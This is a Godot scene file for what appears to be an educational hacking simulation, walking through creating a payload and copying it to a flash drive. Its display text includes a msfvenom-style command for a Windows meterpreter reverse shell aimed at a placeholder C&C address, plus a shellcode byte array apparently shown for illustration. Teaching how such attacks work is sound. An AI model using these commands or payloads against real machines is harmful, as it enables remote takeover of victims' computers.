tracks/2/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [true]
}
tracks/3/type = "value"
tracks/3/imported = false
tracks/3/enabled = true
tracks/3/path = NodePath("WindowsWithShellcode/WindowContainer/move to usb:visible")
tracks/3/interp = 1
tracks/3/loop_wrap = true
tracks/3/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/4/type = "value"
tracks/4/imported = false
tracks/4/enabled = true
tracks/4/path = NodePath("WindowsWithShellcode/WindowContainer/SQLWindow:visible")
tracks/4/interp = 1
tracks/4/loop_wrap = true
tracks/4/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/5/type = "value"
tracks/5/imported = false
tracks/5/enabled = true
tracks/5/path = NodePath("WindowsWithShellcode/WindowContainer/GodotWindow:visible")
tracks/5/interp = 1
tracks/5/loop_wrap = true
tracks/5/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/6/type = "value"
tracks/6/imported = false
tracks/6/enabled = true
tracks/6/path = NodePath("WindowsWithShellcode/WindowContainer/shellcode_txt:visible")
tracks/6/interp = 1
tracks/6/loop_wrap = true
tracks/6/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/7/type = "value"
tracks/7/imported = false
tracks/7/enabled = true
tracks/7/path = NodePath("WindowsWithShellcode/WindowContainer/Label:text")
tracks/7/interp = 1
tracks/7/loop_wrap = true
tracks/7/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["Great! The file has now been created as seen here, Let's copy it into our flashdrive"]
}

[sub_resource type="Animation" id="Animation_1j6a3"]
resource_name = "fileless_start"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["Let's first create the payload"]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [""]
}
tracks/2/type = "value"
tracks/2/imported = false
tracks/2/enabled = true
tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window:visible")
tracks/2/interp = 1
tracks/2/loop_wrap = true
tracks/2/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/3/type = "value"
tracks/3/imported = false
tracks/3/enabled = true
tracks/3/path = NodePath("Margin/Desktop/Icon6:visible")
tracks/3/interp = 1
tracks/3/loop_wrap = true
tracks/3/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/4/type = "value"
tracks/4/imported = false
tracks/4/enabled = true
tracks/4/path = NodePath("Fileless/HSplitContainer/HFlowContainer/Buttons/Next:visible")
tracks/4/interp = 1
tracks/4/loop_wrap = true
tracks/4/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [true]
}
tracks/5/type = "value"
tracks/5/imported = false
tracks/5/enabled = true
tracks/5/path = NodePath("Fileless/HSplitContainer/HFlowContainer/Buttons/FakeNext:visible")
tracks/5/interp = 1
tracks/5/loop_wrap = true
tracks/5/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/6/type = "value"
tracks/6/imported = false
tracks/6/enabled = true
tracks/6/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:visible")
tracks/6/interp = 1
tracks/6/loop_wrap = true
tracks/6/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [true]
}

[sub_resource type="AnimationLibrary" id="AnimationLibrary_o4fi6"]
_data = {
&"RESET": SubResource("Animation_eat0j"),
&"animation_boilerplate_1": SubResource("Animation_07q5i"),
&"animation_boilerplate_2": SubResource("Animation_ma2p5"),
&"animation_boilerplate_3": SubResource("Animation_4u43o"),
&"animation_boilerplate_4": SubResource("Animation_pjxp5"),
&"animation_boilerplate_5": SubResource("Animation_0w6mh"),
&"animation_boilerplate_6": SubResource("Animation_stl7w"),
&"animation_boilerplate_7": SubResource("Animation_1u14y"),
&"fileless_1": SubResource("Animation_8rtlk"),
&"fileless_10": SubResource("Animation_4uhwa"),
&"fileless_11": SubResource("Animation_55b8s"),
&"fileless_12": SubResource("Animation_s614g"),
&"fileless_13": SubResource("Animation_sq4em"),
&"fileless_14": SubResource("Animation_rm36m"),
&"fileless_15": SubResource("Animation_xj15o"),
&"fileless_16": SubResource("Animation_ruw4w"),
&"fileless_2": SubResource("Animation_15poh"),
&"fileless_3": SubResource("Animation_o4fi6"),
&"fileless_4": SubResource("Animation_5bo41"),
&"fileless_5": SubResource("Animation_yn5m6"),
&"fileless_6": SubResource("Animation_axcpf"),
&"fileless_7": SubResource("Animation_u2gx2"),
&"fileless_8": SubResource("Animation_bt0j7"),
&"fileless_9": SubResource("Animation_uxgbj"),
&"fileless_datasql": SubResource("Animation_c6f2f"),
&"fileless_godot": SubResource("Animation_32id3"),
&"fileless_mydrive": SubResource("Animation_xpgrc"),
&"fileless_shellcode": SubResource("Animation_dvkek"),
&"fileless_show_created_file": SubResource("Animation_n6wwr"),
&"fileless_start": SubResource("Animation_1j6a3")
}

[node name="Control" type="TabContainer"]
anchors_preset = 15
anchor_right = 1.0
anchor_bottom = 1.0
grow_horizontal = 2
grow_vertical = 2
current_tab = 2
clip_tabs = false
tabs_visible = false
script = ExtResource("1_tpj4y")

[node name="Margin" type="MarginContainer" parent="."]
visible = false
layout_mode = 2
theme_override_constants/margin_left = 25
theme_override_constants/margin_top = 25
theme_override_constants/margin_right = 25
theme_override_constants/margin_bottom = 25
metadata/_tab_index = 0

[node name="Desktop" type="VFlowContainer" parent="Margin"]
layout_mode = 2
theme_override_constants/h_separation = 20

[node name="Icon" parent="Margin/Desktop" instance=ExtResource("1_hq362")]
layout_mode = 2
script = null

[node name="Label" parent="Margin/Desktop/Icon" index="1"]
text = "PDF"

[node name="Icon2" parent="Margin/Desktop" instance=ExtResource("1_hq362")]
layout_mode = 2
script = null

[node name="Icon3" parent="Margin/Desktop" instance=ExtResource("1_hq362")]
layout_mode = 2
script = null

[node name="Label" parent="Margin/Desktop/Icon3" index="1"]
text = "PNG"

[node name="Icon4" parent="Margin/Desktop" instance=ExtResource("1_hq362")]
layout_mode = 2

[node name="Icon5" parent="Margin/Desktop" instance=ExtResource("1_hq362")]
layout_mode = 2

[node name="Icon6" parent="Margin/Desktop" instance=ExtResource("1_hq362")]
layout_mode = 2

[node name="RadialMenu" type="Control" parent="Margin/Desktop"]
visible = false
custom_minimum_size = Vector2(300, 222.263)
layout_mode = 2
size_flags_horizontal = 0
size_flags_vertical = 0
script = ExtResource("2_b8r0q")

[node name="Fileless" type="MarginContainer" parent="." node_paths=PackedStringArray("animation")]
visible = false
layout_mode = 2
theme_override_constants/margin_left = 25
theme_override_constants/margin_top = 25
theme_override_constants/margin_right = 25
theme_override_constants/margin_bottom = 25
script = ExtResource("4_tpj4y")
animation = NodePath("../AnimationPlayer")
metadata/_tab_index = 1

[node name="HSplitContainer" type="HBoxContainer" parent="Fileless"]
layout_mode = 2

[node name="CodeEdit" type="CodeEdit" parent="Fileless/HSplitContainer"]
layout_mode = 2
size_flags_horizontal = 3
theme_override_font_sizes/font_size = 18
text = "root@cali :~ # msfpoison -p windows/meterpreter/reverse_tcp LHOST=
<C&C Server IP Address>  LPORT=<C&C Server Port> --platform windowds 
--arch x86 -f c -o shellcode.txt

[-] No platform was selected, choosing Msf::Module::Platform::Windows 
from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 333 bytes
Saved as: shellcode.txt
root@cali:- # clear"
gutters_draw_breakpoints_gutter = true
gutters_draw_bookmarks = true
gutters_draw_executing_lines = true
gutters_draw_line_numbers = true
gutters_zero_pad_line_numbers = true

[node name="Overlay" type="ColorRect" parent="Fileless/HSplitContainer/CodeEdit"]
visible = false
material = SubResource("ShaderMaterial_j4e7k")
layout_mode = 1
anchors_preset = 15
anchor_right = 1.0
anchor_bottom = 1.0
grow_horizontal = 2
grow_vertical = 2
mouse_filter = 2

[node name="shellcode_generated_window" parent="Fileless/HSplitContainer/CodeEdit" instance=ExtResource("5_eat0j")]
visible = false
layout_mode = 1
anchor_left = 0.232893
anchor_top = 0.200669
anchor_right = 0.813926
anchor_bottom = 0.795987

[node name="Label" parent="Fileless/HSplitContainer/CodeEdit/shellcode_generated_window/VBoxContainer/Header" index="1"]
text = "SourceCode.cpp"

[node name="body_Label" parent="Fileless/HSplitContainer/CodeEdit/shellcode_generated_window/VBoxContainer/Body/body_Label_Margin" index="0"]
text = "Creating File..."

[node name="RansomwareApp" type="ProgressBar" parent="Fileless/HSplitContainer/CodeEdit/shellcode_generated_window"]
layout_mode = 0
anchor_left = 0.0843835
anchor_top = 0.273785
anchor_right = 0.888371
anchor_bottom = 0.377535

[node name="HFlowContainer" type="HFlowContainer" parent="Fileless/HSplitContainer"]
layout_mode = 2
alignment = 1
last_wrap_alignment = 2

[node name="RichTextLabel" type="RichTextLabel" parent="Fileless/HSplitContainer/HFlowContainer"]
texture_filter = 1
layout_mode = 2
size_flags_horizontal = 3
theme_override_font_sizes/normal_font_size = 18
text = "This command is asking Metasploit’s payload maker (msfvenom) to create a special program for Windows that will secretly call back to my computer’s IP and port "
fit_content = true

[node name="Buttons" type="HBoxContainer" parent="Fileless/HSplitContainer/HFlowContainer"]
self_modulate = Color(1, 1, 1, 0)
layout_mode = 2
size_flags_vertical = 8
theme_override_constants/separation = 165

[node name="Back" type="Button" parent="Fileless/HSplitContainer/HFlowContainer/Buttons"]
layout_mode = 2
theme_override_font_sizes/font_size = 18
text = "Back"
metadata/_edit_use_anchors_ = true

[node name="Next" type="Button" parent="Fileless/HSplitContainer/HFlowContainer/Buttons"]
visible = false
layout_mode = 2
theme_override_font_sizes/font_size = 18
text = "Next"
metadata/_edit_use_anchors_ = true

[node name="FakeNext" type="Button" parent="Fileless/HSplitContainer/HFlowContainer/Buttons"]
layout_mode = 2
theme_override_font_sizes/font_size = 18
text = "Next"
metadata/_edit_use_anchors_ = true

[node name="WindowsWithShellcode" type="MarginContainer" parent="."]
layout_mode = 2
theme_override_constants/margin_left = 25
theme_override_constants/margin_top = 25
theme_override_constants/margin_right = 25
theme_override_constants/margin_bottom = 25
metadata/_tab_index = 2

[node name="Desktop" type="VFlowContainer" parent="WindowsWithShellcode" node_paths=PackedStringArray("animation")]
layout_mode = 2
theme_override_constants/h_separation = 20
script = ExtResource("7_15poh")
animation = NodePath("../../AnimationPlayer")

[node name="Data_icon" parent="WindowsWithShellcode/Desktop" instance=ExtResource("1_hq362")]
layout_mode = 2
script = null

[node name="Button" parent="WindowsWithShellcode/Desktop/Data_icon" index="0"]
icon = SubResource("AtlasTexture_15poh")

[node name="Label" parent="WindowsWithShellcode/Desktop/Data_icon" index="1"]
text = "data.sql"

[node name="Godot_icon" parent="WindowsWithShellcode/Desktop" instance=ExtResource("1_hq362")]
layout_mode = 2
script = null

[node name="Button" parent="WindowsWithShellcode/Desktop/Godot_icon" index="0"]
icon = SubResource("AtlasTexture_o4fi6")

[node name="Label" parent="WindowsWithShellcode/Desktop/Godot_icon" index="1"]
text = "godot.png"

[node name="Text_icon" parent="WindowsWithShellcode/Desktop" instance=ExtResource("1_hq362")]
layout_mode = 2
script = null

[node name="Button" parent="WindowsWithShellcode/Desktop/Text_icon" index="0"]
icon = SubResource("AtlasTexture_5bo41")

[node name="Label" parent="WindowsWithShellcode/Desktop/Text_icon" index="1"]
text = "shellcode.txt"

[node name="My Drive" parent="WindowsWithShellcode/Desktop" instance=ExtResource("1_hq362")]
layout_mode = 2
script = null

[node name="Button" parent="WindowsWithShellcode/Desktop/My Drive" index="0"]
icon = SubResource("AtlasTexture_5bo41")

[node name="Label" parent="WindowsWithShellcode/Desktop/My Drive" index="1"]
text = "My Drive"

[node name="WindowContainer" type="Control" parent="WindowsWithShellcode" node_paths=PackedStringArray("cyberattack_lbl")]
layout_mode = 2
mouse_filter = 2
script = ExtResource("7_8rtlk")
cyberattack_lbl = NodePath("Label")
ransomware_recon_done = true

[node name="GodotWindow" parent="WindowsWithShellcode/WindowContainer" instance=ExtResource("5_eat0j")]
visible = false
layout_mode = 1
anchor_left = 0.392015
anchor_top = 0.162207
anchor_right = 0.95735
anchor_bottom = 0.737458

[node name="Label" parent="WindowsWithShellcode/WindowContainer/GodotWindow/VBoxContainer/Header" index="1"]
text = "godot.png"

[node name="body_Label" parent="WindowsWithShellcode/WindowContainer/GodotWindow/VBoxContainer/Body/body_Label_Margin" index="0"]
text = "dfsdkf9945ksdf054ksdf5906r5k6posgf
"

[node name="SQLWindow" parent="WindowsWithShellcode/WindowContainer" instance=ExtResource("5_eat0j")]
layout_mode = 1
anchor_left = 0.391107
anchor_top = 0.135452
anchor_right = 0.90326
anchor_bottom = 0.715698

[node name="Label" parent="WindowsWithShellcode/WindowContainer/SQLWindow/VBoxContainer/Header" index="1"]
text = "data.sql"

[node name="body_Label" parent="WindowsWithShellcode/WindowContainer/SQLWindow/VBoxContainer/Body/body_Label_Margin" index="0"]
text = "asdasdpofgdi95698t56dogkdfgd"

[node name="shellcode_txt" parent="WindowsWithShellcode/WindowContainer" instance=ExtResource("5_eat0j")]
visible = false
layout_mode = 1
anchor_left = 0.342105
anchor_top = 0.0769231
anchor_right = 0.854258
anchor_bottom = 0.65717

[node name="VBoxContainer" parent="WindowsWithShellcode/WindowContainer/shellcode_txt" index="0"]
offset_left = -5.99973
offset_top = 3.99998
offset_right = -5.99976
offset_bottom = 4.0

[node name="Label" parent="WindowsWithShellcode/WindowContainer/shellcode_txt/VBoxContainer/Header" index="1"]
text = "shellcode.txt"

[node name="body_Label" parent="WindowsWithShellcode/WindowContainer/shellcode_txt/VBoxContainer/Body/body_Label_Margin" index="0"]
text = "unsigned char buf[] = \"
\\\\x33\\\\xc9\\\\x83\\\\xee\\\\x9a\\\\x7e\\\\xe8\\\\xff\\\\xff\\\\xff\\\\xfc\\\\xc0\\\\x5e\\\\x81\\\\x76
\\\\x0e\\\\xeb\\\\x73\\\\x82\\\\x43\\\\x83\\\\xee\\\\xfc\\\\x2e\\\\x4f\\\\x41\\\\x17\\\\x9b\\\\x0d\\\\x43
\\\\xeb\\\\x73\\\\x82\\\\x72\\\\x39\\\\xfa\\\\x67\\\\x27\\\\x60\\\\x21\\\\xbc\\\\x8c\\\\xb9\\\\x0d\\\\x43
\\\\x09\\\\x11\\\\xff\\\\xf8\\\\xf0\\\\x6b\\\\xda\\\\x8c\\\\xd4\\\\x41\\\\x55\\\\x3b\\\\x03\\\\x47\\\\x41
\\\\xfe\\\\x39\\\\x35\\\\xee\\\\x9a\\\\x7e\\\\x82\\\\x43\\\\x82\\\\x24\\\\x7f\\\\xa4\\\\x03\\\\xbc\\\\xf3
\\\\xbc\\\\x11\\\\xbc\\\\xff\\\\x0d\\\\x53\\\\x60\\\\x31\\\\xbe\\\\x43\\\\xbc\\\\xff\\\\xc3\\\\xfc\\\\x3b
\\\\x6e\\\\xb3\\\\x6f\\\\x0f\\\\xea\\\\xa3\\\\x0b\\\\x2b\\\\x1f\\\\xf3\\\\xda\\\\x3a\\\\xea\\\\xa0\\\\x47
\\\\x2b\\\\x2b\\\\x40\\\\x40\\\\x47\\\\x72\\\\x45\\\\x7b\\\\x0b\\\\x60\\\\x76\\\\x40\\\\x91\\\\x46\\\\x03
\\\\xbb\\\\x9a\\\\xf6\\\\x06\\\\x62\\\\x12\\\\x0c\\\\x2b\\\\x47\\\\x64\\\\x27\\\\x45\\\\x2a\\\\x3a\\\\x0b
\\\\xeb\\\\x73\\\\x82\\\\x4c\\\\x47\\\\x41\\\\xc3\\\\xbc\\\\xfd\\\\x0f\\\\xda\\\\x12\\\\xca\\\\x44\\\\x57
\\\\xea\\\\xf3\\\\x7d\\\\x0b\\\\xd9\\\\x9a\\\\x5e\\\\x27\\\\x91\\\\x62\\\\x09\\\\x44\\\\x47\\\\x52\\\\xca
"

[node name="move to usb" parent="WindowsWithShellcode/WindowContainer" instance=ExtResource("5_eat0j")]
visible = false
layout_mode = 2
anchors_preset = 0
anchor_left = 0.329401
anchor_top = 0.083612
anchor_right = 0.854809
anchor_bottom = 0.680602
offset_left = -3.99988
offset_top = 18.0
offset_right = -3.99988
offset_bottom = 18.0

[node name="Label" parent="WindowsWithShellcode/WindowContainer/move to usb/VBoxContainer/Header" index="1"]
text = "shellcode.txt"

[node name="body_Label" parent="WindowsWithShellcode/WindowContainer/move to usb/VBoxContainer/Body/body_Label_Margin" index="0"]
text = "Copying to Flashdrive..."

[node name="RansomwareApp" type="ProgressBar" parent="WindowsWithShellcode/WindowContainer/move to usb"]
layout_mode = 1
anchors_preset = -1
anchor_left = 0.0843835
anchor_top = 0.273785
anchor_right = 0.888371
anchor_bottom = 0.377535

[node name="Label" type="Label" parent="WindowsWithShellcode/WindowContainer"]
layout_mode = 1
anchors_preset = 12
anchor_top = 1.0
anchor_right = 1.0
anchor_bottom = 1.0
offset_top = -31.0
grow_horizontal = 2
grow_vertical = 0
theme_override_font_sizes/font_size = 22

[node name="Next" type="Button" parent="WindowsWithShellcode/WindowContainer"]
layout_mode = 1
anchors_preset = -1
anchor_left = 0.889292
anchor_top = 0.0183946
anchor_right = 0.975499
anchor_bottom = 0.110368
theme_override_font_sizes/font_size = 18
text = "Next"

[node name="AnimationPlayer" type="AnimationPlayer" parent="."]
libraries = {
&"": SubResource("AnimationLibrary_o4fi6")
}

[connection signal="pressed" from="Margin/Desktop/Icon/Button" to="." method="_on_button_pressed_vscode"]
[connection signal="pressed" from="Margin/Desktop/Icon2/Button" to="." method="_on_button_pressed"]
[connection signal="button_down" from="Fileless/HSplitContainer/HFlowContainer/Buttons/Back" to="Fileless" method="_on_back_button_down"]
[connection signal="button_down" from="Fileless/HSplitContainer/HFlowContainer/Buttons/Next" to="Fileless" method="_on_next_button_down"]
[connection signal="button_down" from="WindowsWithShellcode/Desktop/Data_icon/Button" to="WindowsWithShellcode/Desktop" method="_on_button_button_down_datasql"]
[connection signal="button_down" from="WindowsWithShellcode/Desktop/Godot_icon/Button" to="WindowsWithShellcode/Desktop" method="_on_button_button_down_godotpng"]
[connection signal="button_down" from="WindowsWithShellcode/Desktop/Text_icon/Button" to="WindowsWithShellcode/Desktop" method="_on_button_button_down_shellcodetxt"]
[connection signal="button_down" from="WindowsWithShellcode/Desktop/My Drive/Button" to="WindowsWithShellcode/Desktop" method="_on_button_button_down_mydrive"]
[connection signal="button_down" from="WindowsWithShellcode/WindowContainer/Next" to="Fileless" method="_on_next_button_down"]

[editable path="Margin/Desktop/Icon"]
[editable path="Margin/Desktop/Icon2"]
[editable path="Margin/Desktop/Icon3"]
[editable path="Margin/Desktop/Icon4"]
[editable path="Fileless/HSplitContainer/CodeEdit/shellcode_generated_window"]
[editable path="WindowsWithShellcode/Desktop/Data_icon"]
[editable path="WindowsWithShellcode/Desktop/Godot_icon"]
[editable path="WindowsWithShellcode/Desktop/Text_icon"]
[editable path="WindowsWithShellcode/Desktop/My Drive"]
[editable path="WindowsWithShellcode/WindowContainer/GodotWindow"]
[editable path="WindowsWithShellcode/WindowContainer/SQLWindow"]
[editable path="WindowsWithShellcode/WindowContainer/shellcode_txt"]
[editable path="WindowsWithShellcode/WindowContainer/move to usb"]
